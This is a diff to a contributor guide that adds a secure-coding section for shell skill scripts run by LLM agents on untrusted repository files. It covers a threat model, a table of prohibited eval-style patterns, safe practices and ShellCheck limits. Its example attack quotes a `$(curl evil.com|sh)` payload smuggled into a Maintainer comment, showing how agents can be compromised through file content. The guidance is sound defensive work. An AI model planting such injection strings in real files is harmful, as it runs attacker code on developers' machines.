@@ -98,3 +98,59 @@ Edit `tools/install.sh`, then run `make test` to verify no regressions.
 4.  **No Secrets:** Never hardcode API keys or credentials.
 5.  **Injection Prevention:** Sanitize user input passed to shell scripts.
 6.  **No PII:** Do not mention specific users, GitHub handles, or team names.
+
+## 5. Security: Skill Scripts and Untrusted File Content
+
+Skill scripts in `skills/*/scripts/` are executed **by LLM agents** on
+files that may contain **attacker-controlled content** (e.g., a malicious
+PR to the target repo). This context demands higher security standards than
+typical developer tooling.
+
+### Threat Model
+
+An attacker gets malicious content merged into the target repo's main branch
+unnoticed (e.g., a crafted `# Maintainer:` comment that passes casual code
+review). Later, a legitimate developer works on that same file and invokes a
+skill via their LLM agent. If the skill script interprets file content as
+code (e.g., via `eval`), the attacker's payload executes in the developer's
+agent session.
+
+### Example Attack
+
+A file contains `# Maintainer: $(curl evil.com|sh)`. An awk script extracts
+this value and emits `MAINTAINER_VALUE="$(curl evil.com|sh)"`. The shell
+`eval` on this output executes the injection.
+
+### Prohibited Patterns
+
+| Pattern | Risk | Safe Alternative |
+|---------|------|------------------|
+| `eval "$var"` where `$var` contains file-derived data | Command injection via `$()`, backticks, or quote-breaking | `readarray` + positional awk output |
+| `source <(command_reading_file)` | Same as eval | Parse output with `read` or arrays |
+| Unquoted `$var` in `for` loops with `find` output | Word splitting on crafted filenames | `while IFS= read -r -d ''` with `find -print0` |
+| `printf -v varname "$untrusted"` | Format string injection | Validate input before printf |
+
+### Mandatory Practices for Skill Scripts
+
+1.  **Never use `eval`** on data derived from file content. If awk/sed
+    produces structured output, use `readarray -t` with line-per-value
+    format instead.
+2.  **Quote all variables** in command arguments and use `[[ ]]` for tests.
+3.  **Validate format** of any value extracted from untrusted files before
+    using it in output or passing it to other tools.
+4.  **Use `find -print0 | while read -r -d ''`** instead of
+    `for file in $(find ...)` when iterating over file paths.
+5.  **ShellCheck with `--enable=all --severity=warning`** is enforced by the
+    Makefile. SC2154 warnings ("referenced but not assigned") often indicate
+    an `eval` pattern and must be resolved structurally, not suppressed.
+
+### ShellCheck Limitations
+
+ShellCheck is a static syntax linter, **not** a taint-analysis tool. It
+**cannot** detect:
+-   `eval` injection when the variable is properly quoted (`eval "$var"`)
+-   Data flow from file content through awk/sed into shell variable assignment
+-   Word splitting in `for` loop contexts (intentionally suppressed by SC2086)
+
+Do not treat a clean shellcheck run as proof of security. Any script that
+reads untrusted file content requires manual review for the patterns above.
